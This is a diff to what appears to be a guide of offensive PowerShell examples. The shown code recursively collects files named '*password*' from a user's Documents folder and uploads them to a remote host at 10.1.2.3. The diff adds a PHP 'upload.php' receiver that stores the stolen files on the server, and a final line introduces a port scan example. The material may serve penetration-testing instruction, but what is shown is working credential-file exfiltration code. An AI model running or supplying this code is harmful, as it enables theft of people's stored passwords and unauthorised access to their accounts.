@@ -22,12 +22,13 @@ if($ckpath -eq $null) {
    $up = New-Object Chilkat.Upload
    $docs = [environment]::getfolderpath("mydocuments")
    $up.Hostname = "10.1.2.3"
-   $up.Port = 8000
-   $up.Path = "/upload"
+   $up.Port = 80
+   $up.Path = "/upload.php"
    $up.Expect100Continue = $false
    $f = Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName
    if($f -ne $null) {
-      $f | ForEach-Object { $up.AddFileReference("files", $_) }
+      $i = 1
+      $f | ForEach-Object { $up.AddFileReference("file" + $i, $_); $i++ }
       $r = $up.BlockingUpload()
       if($r -eq $true) {
          Write-Host "$($f.Count) files uploaded"
@@ -43,6 +44,24 @@ if($ckpath -eq $null) {
       Write-Host "No matching files found"
    }
 }
+```
+
+The upload.php script to receive the files could look like this.
+
+```php
+<?php
+if(!empty($_FILES))
+{
+   $fpath = "/apachetmp/";
+   foreach(array_keys($_FILES) as $f)
+   {
+      if($_FILES[$f]['error'] == 0)
+      {
+         move_uploaded_file($_FILES[$f]['tmp_name'], $fpath . $_FILES[$f]['name']);
+      }
+   }
+}
+?>
 ```
 
 **This example performs a TCP port scan.**
